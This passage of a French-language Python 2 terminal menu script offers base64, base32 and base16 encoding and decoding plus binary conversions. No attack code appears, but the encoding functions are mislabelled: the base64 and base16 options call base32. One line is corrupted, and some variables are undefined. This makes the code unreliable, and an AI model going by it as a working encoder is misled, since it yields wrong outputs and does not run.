    print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage echouer")
    raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
    menu_decode()
####################################################################################################
def dec():     
  try:
     cls()  
     charge()
     cls()
     print(logo)
     resulat_image = open('deer_decode.gif', 'wb') 
     image_64_decodage = base64.decodestring(image_64_encodage) 
     resulat_image.write(image_64_decodage)
     load("\033[1;97mChargement\033[1;93m...")
     print (image_64_decodage)
     print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Decompilage reussi")
     raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
     menu_base_image()
  except IOError:
     print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Decompilage echouer")
     print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Veuillez apprendre beaucoup pour utiliser ce script. Merci")
     raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
     menu_base_image()
####################################################################################################
#################################################################################################### 
def menu_encodage_texte():
	cls()
	print(logo)
	print("\033[1;97m‚ïî"+30*"‚ïê"+1*"‚ïê‚ïó")
	print("\033[1;97m‚ïë \033[1;91m[\033[1;96m1.\033[1;91m]\033[38;5;136m Encodage base64     \033[1;97m     ‚ïë")
	print("\033[1;97m‚ïë \033[1;91m[\033[1;96m2.\033[1;91m]\033[38;5;111m Encodage base32     \033[1;97m     ‚ïë")
	print("\033[1;97m‚ïë \033[1;91m[\033[1;96m3.\033[1;91m]\033[38;5;112m Encodage base16     \033[1;97m     ‚ïë")
	print("\033[1;97m‚ïë \033[1;91m[\033[1;96m4.\033[1;91m]\033[38;5;115m Decodage base64     \033[1;97m     ‚ïë")
	print("\033[1;97m‚ïë \033[1;91m[\033[1;96m5.\033[1;91m]\033[38;5;214m Decodage base32     \033[1;97m     ‚ïë")
	print("\033[1;97m‚ïë \033[1;91m[\033[1;96m6.\033[1;91m]\033[38;5;116m Decodage base16     \033[1;97m     ‚ïë")
	print("\033[1;97m‚ïë \033[1;91m[\033[1;96m7.\033[1;91m]\033[38;5;145m Cryptage binaire    \033[1;97m     ‚ïë")
	print("\033[1;97m‚ïë \033[1;91m[\033[1;96m8.\033[1;91m]\033[38;5;247m Cryptage binaire 2  \033[1;97m     ‚ïë")
	print("\033[1;97m‚ïë \033[1;91m[\033[1;96mP \033[1;91m]\033[38;5;127m Menu Precedent      \033[1;97m     ‚ïë")
	print("\033[1;97m‚ïë \033[1;91m[\033[1;96mM \033[1;91m]\033[38;5;121m Menu Principal      \033[1;97m     ‚ïë")
	print("\033[1;97m‚ïö"+30*"‚ïê"+1*"‚ïê‚ïù")   
	print("\033[1;97m‚ïë")
	choisir_bases()
def choisir_bases():    
    dmd = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[38;5;245m Mr \033[38;5;221mFaxel \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;96m")
    if dmd =="":
        print("\n\t\033[1;91m[\033[1;93m!\033[1;91m]\033[1;95m Remplissez correctement ")
	menu_encodage_texte()
    elif dmd =="1":
        enco_base64()
    elif dmd =="2":
        enco_base32()
    elif dmd =="3":
        enco_base16()
    elif dmd =="4":
        deco_base64()
    elif dmd =="5":
        deco_base32()
    elif dmd =="6":
        deco_base16()
    elif dmd =="7":
        binaire()
    elif dmd =="8":
        binaire_2()
    elif dmd =="p" or dmd =="P":
        menu_bases()
    elif dmd =="m" or dmd =="M":
        menu()
    else: 
        print('\n\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m '+dmd+' \x1b[1;91mindisponible')
        raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
        menu_encodage_texte()
####################################################################################################
def enco_base64():
         cls()
         mael("\033[1;92mInfo\033[1;91m :\033[1;97m Veuillez saisir votre texte.")
         codeur=raw_input("\033[1;91m[\033[1;93m***\033[1;91m][38;5;79m Entrer le texte a decoder.    \033[1;91m[\033[1;93m***\033[1;91m]\n\n\033[1;97m")
         tic = time.clock()
         emplacement = raw_input("\033[1;91m[\033[1;97m++\033[1;91m] [38;5;218mNommez votre resultats\x1b[1;91m : \x1b[1;93m ")
         print("\033[1;91m[\033[1;93m---\033[1;91m]\033[1;97m  Votre texte en Base64 a decoder est \033[91;1m:\n\n[38;5;70m {}".format(codeur))
         print("\033[1;91m[\033[1;93m***\033[1;91m][38;5;221m  Il est constituer de\033[1;93m",len(codeur), '[38;5;221mcaracteres \033[1;91m[\033[1;93m***\033[1;91m]')
         compresse_1 = codeur.encode("UTF-8")              
         compresse_2 = base64.b32encode(compresse_1)             
         resultat = compresse_2.decode("UTF-8")             
	 save = open(emplacement,"w")
	 save.write(resultat)
         save.close()
         print("\033[1;91m[\033[1;93m---\033[1;91m]\033[1;97m  Le texte decoder est le suivant \033[91;1m:\n\n[38;5;70m {}".format(resultat))
         print("\033[1;91m[\033[1;93m***\033[1;91m][38;5;228m  Il est constituer de\033[1;93m",len(resultat), '[38;5;228mcaracteres \033[1;91m[\033[1;93m***\033[1;91m]')             
         toc = time.clock()
         ttn = toc - tic
         print("\x1b[38;5;212m<‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê>")
         print("\n\x1b[1;97m‚ïë\033[1;91m[\033[1;97m--\033[1;91m] \x1b[1;97mEnregistrer sous [38;5;112m "+str(trap)+"\x1b[1;97m dans votre repertoire.\x1b[1;97m‚ïë")
         print("\x1b[1;97m‚ïë\033[1;91m[\033[1;97m**\033[1;91m] [38;5;108mTerminer en\x1b[1;92m "+str(ttn)+" [38;5;108msecondes.\x1b[1;97m‚ïë")
         print("\x1b[38;5;212m<‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê>")
         print("                       \033[48;5;0;38;5;197mMr Faxel                   ")            
         raw_input('\n\033[1;91m[\033[1;97mRetour\033[1;91m]')
	 menu_encodage_texte()
####################################################################################################		
def enco_base32():
         cls()
         mael("\033[1;92mInfo\033[1;91m :\033[1;97m Veuillez saisir votre texte.")
         codeur=raw_input("\033[1;91m[\033[1;93m***\033[1;91m][38;5;79m Entrer le texte a decoder.    \033[1;91m[\033[1;93m***\033[1;91m]\n\n\033[1;97m")
         tic = time.clock()
         emplacement = raw_input("\033[1;91m[\033[1;97m++\033[1;91m] [38;5;218mNommez le resultat\x1b[1;91m : \x1b[1;93m ")
	 print("\033[1;91m[\033[1;93m---\033[1;91m]\033[1;97m  Votre texte en Base32 a coder est \033[91;1m:\n\n[38;5;70m {}".format(codeur))
         print("\033[1;91m[\033[1;93m***\033[1;91m][38;5;221m  Il est constituer de\033[1;93m",len(codeur), '[38;5;221mcaracteres \033[1;91m[\033[1;93m***\033[1;91m]')
         compresse_1 = codeur.encode("UTF-8")              
         compresse_2 = base64.b32encode(compresse_1)             
         resultat = compresse_2.decode("UTF-8")
	 save = open(emplacement,"w")
	 save.write(resultat)
         save.close()
         print("\033[1;91m[\033[1;93m---\033[1;91m]\033[1;97m  Le texte decoder est le suivant \033[91;1m:\n\n[38;5;70m {}".format(resultat))
         print("\033[1;91m[\033[1;93m***\033[1;91m][38;5;228m  Il est constituer de\033[1;93m",len(resultat), '[38;5;228mcaracteres \033[1;91m[\033[1;93m***\033[1;91m]')             
         toc = time.clock()
         ttn = toc - tic
         print("\x1b[38;5;212m<‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê>")
         print("\n\x1b[1;97m‚ïë\033[1;91m[\033[1;97m--\033[1;91m] \x1b[1;97mEnregistrer sous [38;5;112m "+str(trap)+"\x1b[1;97m dans votre repertoire.\x1b[1;97m‚ïë")
         print("\x1b[1;97m‚ïë\033[1;91m[\033[1;97m**\033[1;91m] [38;5;108mTerminer en\x1b[1;92m "+str(ttn)+" [38;5;108msecondes.\x1b[1;97m‚ïë")
         print("\x1b[38;5;212m<‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê>")
         print("                       \033[48;5;0;38;5;197mMr Faxel                   ")            
         raw_input('\n\033[1;91m[\033[1;97mRetour\033[1;91m]')
	 menu_encodage_texte()
####################################################################################################		
def enco_base16():
         cls()
         mael("\033[1;92mInfo\033[1;91m :\033[1;97m Veuillez saisir votre texte.")
         codeur=raw_input("\033[1;91m[\033[1;93m***\033[1;91m][38;5;79m Entrer le texte a decoder.    \033[1;91m[\033[1;93m***\033[1;91m]\n\n\033[1;97m")
         tic = time.clock()
         emplacement = raw_input("\033[1;91m[\033[1;97m++\033[1;91m] [38;5;218mNommez votre resultats\x1b[1;91m : \x1b[1;93m ")
         print("\033[1;91m[\033[1;93m---\033[1;91m]\033[1;97m  Votre texte en Base16 a coder est \033[91;1m:\n\n[38;5;70m {}".format(codeur))
         print("\033[1;91m[\033[1;93m***\033[1;91m][38;5;221m  Il est constituer de\033[1;93m",len(codeur), '[38;5;221mcaracteres \033[1;91m[\033[1;93m***\033[1;91m]')
         compresse_1 = codeur.encode("UTF-8")              
         compresse_2 = base64.b32encode(compresse_1)             
         resultat = compresse_2.decode("UTF-8")             
	 save = open(emplacement,"w")
	 save.write(resultat)
         save.close()
         print("\033[1;91m[\033[1;93m---\033[1;91m]\033[1;97m  Le texte decoder est le suivant \033[91;1m:\n\n[38;5;70m {}".format(resultat))
         print("\033[1;91m[\033[1;93m***\033[1;91m][38;5;228m  Il est constituer de\033[1;93m",len(resultat), '[38;5;228mcaracteres \033[1;91m[\033[1;93m***\033[1;91m]')             
         toc = time.clock()
         ttn = toc - tic
         print("\x1b[38;5;212m<‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê>")
         print("\n\x1b[1;97m‚ïë\033[1;91m[\033[1;97m--\033[1;91m] \x1b[1;97mEnregistrer sous [38;5;112m "+str(trap)+"\x1b[1;97m dans votre repertoire.\x1b[1;97m‚ïë")
         print("\x1b[1;97m‚ïë\033[1;91m[\033[1;97m**\033[1;91m] [38;5;108mTerminer en\x1b[1;92m "+str(ttn)+" [38;5;108msecondes.\x1b[1;97m‚ïë")
         print("\x1b[38;5;212m<‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê>")
         print("                       \033[48;5;0;38;5;197mMr Faxel                   ")            
         raw_input('\n\033[1;91m[\033[1;97mRetour\033[1;91m]')
	 menu_encodage_texte()
####################################################################################################
def binaire():
	script = raw_input("\033[1;91m[\033[1;97m++\033[1;91m] [38;5;218mEntrer votre texte \x1b[1;91m : \x1b[1;93m ")
        emplacement = raw_input("\033[1;91m[\033[1;97m++\033[1;91m] [38;5;218mNommez  le resultat binair\x1b[1;91m : \x1b[1;93m ")
        emplacement_binaire = raw_input("\033[1;91m[\033[1;97m++\033[1;91m] [38;5;218mNommez  le resultat binair\x1b[1;91m : \x1b[1;93m ")
	if len(script)%3 == 2:
	     rembourrage = '='
        elif len(script)%3 == 1:
	     rembourrage = '=='
        else:
	     rembourrage = ''
        b =''
        for i in script:
	        print('\033[1;95m%s\033[1;97m, en\033[1;92m binaire \033[1;91m‚óè‚ïê‚ïê‚ïê‚ïê‚ïê‚ñ∫ \033[1;95m%s\033[1;97m, en\033[1;94m ascii \033[1;91m‚óè‚ïê‚ïê‚ïê‚ïê‚ïê‚ñ∫ \033[1;95m%s'%(i, bin(ord(i))[2:].zfill(8),ord(i)))
	        b += str(bin(ord(i))[2:].zfill(8)+ ' ')
        print('\n\033[1;97mFichiers binaires repartie en caractere de votre saisie\033[1;92m"\033[1;92m%s\033[1;95m"\033[1;97m est\033[1;95m "\033[1;96m%s\033[1;96m"'%(codeur,b[:-1])
        print('\n\033[1;97mL\'alignement des fichiers binaires \033[1;91m(\033[1;94mc\'est a dire en binaire group√©\033[1;91m)\033[1;97m de votre saisie\033[1;95m"\033[1;92m%s\033[1;95m"\033[1;97m est \033[1;95m"\033[1;93m%s\033[1;95m"'%(codeur,(b).replace(' ',''))   
        x = (b).replace(' ','')
        k = '-'.join(x[i:i+6] for i in range(0, len(x), 6))
        print('\n' + k)
        if rembourrage != '':
	      print '\n\033[1;97mSi la longueur du mot n\'est pas un multiple de\033[1;91m 3\033[1;97m,\nil y aura un remplissage de\033[1;95m "\033[1;92m%s\033[1;95m" tant que c\'est\033[1;96m %s caracteres '%(rembourrage,len(rembourrage))
	      n = ',\033[1;94m avec rembourrage'
        else:
	      n = ''
        ant = ''
        word = {0:'A',1:'B',2:'C',3:'D',4:'E',5:'F',6:'G',7:'H',8:'I',9:'J',10:'K',11:'L',12:'M',13:'N',14:'O',15:'P',16:'Q',17:'R',18:'S',19:'T',20:'U',21:'V',22:'W',23:'X',24:'Y',25:'Z',26:'a',27:'b',28:'c',29:'d',30:'e',31:'f',32:'g',33:'h',34:'i',35:'j',36:'k',37:'l',38:'m',39:'n',40:'o',41:'p',42:'q',43:'r',44:'s',45:'t',46:'u',47:'v',48:'w',49:'x',50:'y',51:'z',52:'0',53:'1',54:'2',55:'3',56:'4',57:'5',58:'6',59:'7',60:'8',61:'9',62:'+',63:'/'}
        for c in k.split('-'):
	    if len(c) == 6:
		 mael = '00' + c
	    elif len(c) == 4:
		 mael = '00' + c + '00'
	    elif len(c) == 2:
		 mael = '00' + c + '0000'
	    m = int(mael,2)
	    if len(str(m)) == 1:
		 m = str(m) + ' '
	    j = ''.join(word[o] for o in word if int(m) == o)
	    print('%s = %s      = %s'%(mael , m , j))
	    ant += j
	save = open(emplacement,"w")
	save.write(j)
        save.close()
	saves = open(emplacement_binaire,"w")
	saves.write(x)
        saves.close()
	raw_input('\n\033[1;91m[\033[1;97mRetour\033[1;91m]')
	menu_encodage_texte()
####################################################################################################	
def binaire_2():
	script = raw_input("\033[1;91m[\033[1;97m++\033[1;91m] [38;5;218mNommez  le resultat binair\x1b[1;91m : \x1b[1;93m ")
        #binary = raw_input("\033[1;91m[\033[1;97m++\033[1;91m] [38;5;218mNommez  le resultat binair\x1b[1;91m : \x1b[1;93m ")
        if len(script)%3 == 2:
	     rembourrage = '='
        elif len(script)%3 == 1:
	     rembourrage = '=='
        else:
	     rembourrage = ''
        b = ''
        for i in script:
	     print'\033[1;95m%s\033[1;97m, en\033[1;92m binaire \033[1;91m‚óè‚ïê‚ïê‚ïê‚ïê‚ïê‚ñ∫ \033[1;95m%s\033[1;97m, en\033[1;94m ascii \033[1;91m‚óè‚ïê‚ïê‚ïê‚ïê‚ïê‚ñ∫ \033[1;95m%s'%(i, bin(ord(i))[2:].zfill(8),ord(i))
	     b += str(bin(ord(i))[2:].zfill(8)+ ' ')
        print('\n\033[1;97mFichiers binaires repartie en caractere de votre saisie\033[1;92m"\033[1;92m%s\033[1;95m"\033[1;97m est\033[1;95m "\033[1;96m%s\033[1;96m"'%(codeur,b[:-1])
        print('\n\033[1;97mL\'alignement des fichiers binaires \033[1;91m(\033[1;94mc\'est a dire en binaire group√©\033[1;91m)\033[1;97m de votre saisie\033[1;95m"\033[1;92m%s\033[1;95m"\033[1;97m est \033[1;95m"\033[1;93m%s\033[1;95m"'%(codeur,(b).replace(' ',''))   
        raw_input('\n\033[1;91m[\033[1;97mRetour\033[1;91m]')
	menu_encodage_texte()
####################################################################################################
####################################################################################################
def deco_base64():
         cls()
         mael("\033[1;92mInfo\033[1;91m :\033[1;97m Veuillez saisir votre texte a decoder ou\nCopier l'exemple ci dessous pour effectuer un essai.")
         mael("\033[1;91m[\033[1;93m+++\033[1;91m][38;5;214m  Exemple\033[1;97m, copier ce texte et coller.\033[1;91m [\033[1;97m+++\033[1;91m] ")
         print("\033[1;96m\n8J+Xo++4j01yIEhhY2tlcl9LIHR1IGVzIHVuIGfDqW5p\n8J+RjfCfkqouIEplIHN1aXMgZmllciBkZSB0b2kuIOKdpO+4j/CfpbA=")rint("\033[1;96m\nF09F97A3EFB88F4D72204861636B65725F4B20747520657320756E2067C3A96E69F09F918DF09F92AA2E204A65207\n3756973206669657220646520746F692E20E29DA4EFB88FF09FA5B0")
         decodeur=raw_input("\033[1;91m[\033[1;93m***\033[1;91m][38;5;79m  Saisissez votre texte a decoder.    \033[1;91m[\033[1;93m***\033[1;91m]\n\n\033[1;97m")
         tic = time.clock()
         emplacement = raw_input("\033[1;91m[\033[1;97m++\033[1;91m] [38;5;218mNommez votre resultats\x1b[1;91m : \x1b[1;93m ")
         systeme1 = decodeur.decode("UTF-8")
         print("\033[1;91m[\033[1;93m---\033[1;91m]\033[1;97m  Votre texte en Base64 a decoder est \033[91;1m:\n\n[38;5;70m {}".format(decodeur))
         print("\033[1;91m[\033[1;93m***\033[1;91m][38;5;221m  Il est constituer de\033[1;93m",len(decodeur), '[38;5;221mcaracteres \033[1;91m[\033[1;93m***\033[1;91m]')
         faxel = systeme1.decode("UTF-8")
         mael = base64.b64decode(faxel)
         systeme2 = mael.decode("UTF-8")              
	 save = open(emplacement,"w")
	 save.write(systeme2)
         save.close()
         print("\033[1;91m[\033[1;93m---\033[1;91m]\033[1;97m  Le texte decoder est le suivant \033[91;1m:\n\n[38;5;70m {}".format(systeme2))
         print("\033[1;91m[\033[1;93m***\033[1;91m][38;5;228m  Il est constituer de\033[1;93m",len(systeme2), '[38;5;228mcaracteres \033[1;91m[\033[1;93m***\033[1;91m]')             
         toc = time.clock()
         ttn = toc - tic
         print("\x1b[38;5;212m<‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê>")
         print("\n\x1b[1;97m‚ïë\033[1;91m[\033[1;97m--\033[1;91m] \x1b[1;97mEnregistrer sous [38;5;112m "+str(trap)+"\x1b[1;97m dans votre repertoire.\x1b[1;97m‚ïë")
         print("\x1b[1;97m‚ïë\033[1;91m[\033[1;97m**\033[1;91m] [38;5;108mTerminer en\x1b[1;92m "+str(ttn)+" [38;5;108msecondes.\x1b[1;97m‚ïë")
         print("\x1b[38;5;212m<‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê>")
         print("                       \033[48;5;0;38;5;197mMr Faxel                   ")            
         raw_input('\n\033[1;91m[\033[1;97mRetour\033[1;91m]')
	 menu_encodage_texte()
####################################################################################################
def deco_base32():
         cls()
         mael("\033[1;92mInfo\033[1;91m :\033[1;97m Veuillez saisir votre texte a decoder ou\nCopier l'exemple ci dessous pour effectuer un essai.")
         mael("\033[1;91m[\033[1;93m+++\033[1;91m][38;5;214m  Exemple\033[1;97m, copier ce texte et coller.\033[1;91m [\033[1;97m+++\033[1;91m] ")
         print("\033[1;96m\n6CPZPI7PXCHU24RAJBQWG23FOJPUWIDUOUQGK4ZAOVXCAZ6DVFXGT4E7SGG7BH4SVIX\nCASTFEBZXK2LTEBTGSZLSEBSGKIDUN5US4IHCTWSO7OEP6CP2LMA=")
         decodeur=raw_input("\033[1;91m[\033[1;93m***\033[1;91m][38;5;79m  Saisissez votre texte a decoder.    \033[1;91m[\033[1;93m***\033[1;91m]\n\n\033[1;97m")
         tic = time.clock()
         emplacement = raw_input("\033[1;91m[\033[1;97m++\033[1;91m] [38;5;218mNommez votre resultats\x1b[1;91m : \x1b[1;93m ")
         systeme1 = decodeur.decode("UTF-8")
         print("\033[1;91m[\033[1;93m---\033[1;91m]\033[1;97m  Votre texte en Base32 a decoder est \033[91;1m:\n\n[38;5;70m {}".format(decodeur))
         print("\033[1;91m[\033[1;93m***\033[1;91m][38;5;221m  Il est constituer de\033[1;93m",len(decodeur), '[38;5;221mcaracteres \033[1;91m[\033[1;93m***\033[1;91m]')
         faxel = systeme1.decode("UTF-8")
         mael = base64.b32decode(faxel)
         systeme2 = mael.decode("UTF-8")              
	 save = open(emplacement,"w")
	 save.write(systeme2)
         save.close()
         print("\033[1;91m[\033[1;93m---\033[1;91m]\033[1;97m  Le texte decoder est le suivant \033[91;1m:\n\n[38;5;70m {}".format(systeme2))
         print("\033[1;91m[\033[1;93m***\033[1;91m][38;5;228m  Il est constituer de\033[1;93m",len(systeme2), '[38;5;228mcaracteres \033[1;91m[\033[1;93m***\033[1;91m]')             
         toc = time.clock()
         ttn = toc - tic
         print("\x1b[38;5;212m<‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê>")
         print("\n\x1b[1;97m‚ïë\033[1;91m[\033[1;97m--\033[1;91m] \x1b[1;97mEnregistrer sous [38;5;112m "+str(trap)+"\x1b[1;97m dans votre repertoire.\x1b[1;97m‚ïë")
         print("\x1b[1;97m‚ïë\033[1;91m[\033[1;97m**\033[1;91m] [38;5;108mTerminer en\x1b[1;92m "+str(ttn)+" [38;5;108msecondes.\x1b[1;97m‚ïë")
         print("\x1b[38;5;212m<‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê>")
         print("                       \033[48;5;0;38;5;197mMr Faxel                   ")            
         raw_input('\n\033[1;91m[\033[1;97mRetour\033[1;91m]')
	 menu_encodage_texte()
####################################################################################################
def deco_base16():
         cls()
         mael("\033[1;92mInfo\033[1;91m :\033[1;97m Veuillez saisir votre texte a decoder ou\nCopier l'exemple ci dessous pour effectuer un essai.")
         mael("\033[1;91m[\033[1;93m+++\033[1;91m][38;5;214m  Exemple\033[1;97m, copier ce texte et coller.\033[1;91m [\033[1;97m+++\033[1;91m] ")
         print("\033[1;96m\nF09F97A3EFB88F4D72204861636B65725F4B20747520657320756E2067C3A96E69F09F918DF09F92AA2E204A65207\n3756973206669657220646520746F692E20E29DA4EFB88FF09FA5B0")
         decodeur=raw_input("\033[1;91m[\033[1;93m***\033[1;91m][38;5;79m  Saisissez votre texte a decoder.    \033[1;91m[\033[1;93m***\033[1;91m]\n\n\033[1;97m")
         tic = time.clock()
         emplacement = raw_input("\033[1;91m[\033[1;97m++\033[1;91m] [38;5;218mNommez votre resultats\x1b[1;91m : \x1b[1;93m ")
         systeme1 = decodeur.decode("UTF-8")
         print("\033[1;91m[\033[1;93m---\033[1;91m]\033[1;97m  Votre texte en Base16 a decoder est \033[91;1m:\n\n[38;5;70m {}".format(decodeur))
         print("\033[1;91m[\033[1;93m***\033[1;91m][38;5;221m  Il est constituer de\033[1;93m",len(decodeur), '[38;5;221mcaracteres \033[1;91m[\033[1;93m***\033[1;91m]')
         faxel = systeme1.decode("UTF-8")
         mael = base64.b16decode(faxel)
         systeme2 = mael.decode("UTF-8")              
	 save = open(emplacement,"w")
	 save.write(systeme2)
         save.close()
         print("\033[1;91m[\033[1;93m---\033[1;91m]\033[1;97m  Le texte decoder est le suivant \033[91;1m:\n\n[38;5;70m {}".format(systeme2))
         print("\033[1;91m[\033[1;93m***\033[1;91m][38;5;228m  Il est constituer de\033[1;93m",len(systeme2), '[38;5;228mcaracteres \033[1;91m[\033[1;93m***\033[1;91m]')             
         toc = time.clock()
         ttn = toc - tic
         print("\x1b[38;5;212m<‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê>")
         print("\n\x1b[1;97m‚ïë\033[1;91m[\033[1;97m--\033[1;91m] \x1b[1;97mEnregistrer sous [38;5;112m "+str(trap)+"\x1b[1;97m dans votre repertoire.\x1b[1;97m‚ïë")
         print("\x1b[1;97m‚ïë\033[1;91m[\033[1;97m**\033[1;91m] [38;5;108mTerminer en\x1b[1;92m "+str(ttn)+" [38;5;108msecondes.\x1b[1;97m‚ïë")
         print("\x1b[38;5;212m<‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê>")
         print("                       \033[48;5;0;38;5;197mMr Faxel                   ")            
         raw_input('\n\033[1;91m[\033[1;97mRetour\033[1;91m]')
	 menu_encodage_texte()
####################################################################################################
####################################################################################################
def Menu_Feliciter_Signal():
    cls()	
    print(logo)
    horaire()
    print("\033[1;97m‚ïî"+30*"‚ïê"+1*"‚ïê‚ïó")
    print("\033[1;97m‚ïë \033[1;91m[\033[1;96m1.\033[1;91m]\033[38;5;112m F√©liciter \033[38;5;214mFaxel       \033[1;97m   ‚ïë") 
    print("\033[1;97m‚ïë \033[1;91m[\033[1;96m2.\033[1;91m]\033[38;5;245m Signaler un bug       \033[1;97m   ‚ïë")
    print("\033[1;97m‚ïë \033[1;91m[\033[1;96m3.\033[1;91m]\033[38;5;115m Signaler un compte FB \033[1;97m   ‚ïë")
    print("\033[1;97m‚ïë \033[1;91m[\033[1;96m4.\033[1;91m]\033[38;5;136m Danger \033[1;97m(\033[1;91mremove\033[1;97m)          ‚ïë")
    print("\033[1;97m‚ïë \033[1;91m[\033[1;96mM.\033[1;91m]\033[48;5;0;38;5;192m Menu General         \033[1;97m    ‚ïë")
    print("\033[1;97m‚ïö"+30*"‚ïê"+1*"‚ïê‚ïù")   
    print("\033[1;97m‚ïë")
    choix_base_image() 
def choix_base_image():    
    dmd = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[38;5;245m Mr \033[38;5;221mFaxel \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;96m")
    if dmd =="":
        print ("\n\t\033[1;91m[!] Remplissez correctement ")
	Menu_Feliciter_Signal()
    elif dmd =="1":
        feliciter()
    elif dmd =="2":
        signal_bug()
    elif dmd =="3":
        Signal_Fb()
    elif dmd =="4":
        clean_remove()
    elif dmd =="m" or dmd =="M":
        menu()
    else: 
        print('\n\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m '+dmd+' \x1b[1;91mindisponible')
        raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
        Menu_Feliciter_Signal()	
####################################################################################################
def feliciter():	
	cls()
